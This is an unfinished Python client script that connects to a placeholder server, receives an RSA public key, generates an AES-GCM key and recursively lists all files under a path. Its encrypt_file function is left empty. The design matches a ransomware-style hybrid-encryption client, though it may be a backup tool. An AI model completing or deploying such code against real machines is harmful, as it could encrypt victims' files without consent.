import socket
import pathlib
from cryptography.hazmat.primitives import serialization
from client.file import File
#import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os




def connect_to_server(public_ip, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((public_ip, port))
    return client_socket


def get_all_files(path):
    all_files = []
    dir_path = pathlib.Path(path)

    for item in dir_path.rglob("*"):
        if item.is_file():
            all_files.append(File(item.name, str(item.resolve()), item.stat().st_size))

    return all_files


def encrypt_file(nonce, file, associated_data=None):



def main():
    print("now starting main....")
    server_public_ip = "SERVER_PUBLIC_IP"
    port = 8080

    server_sock = connect_to_server(server_public_ip, port)
    public_key_bytes = server_sock.recv(4096)
    rsa_public_key = serialization.load_pem_public_key(public_key_bytes)

    AES_key_256 = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(12)





if __name__ == "__main__":
    main()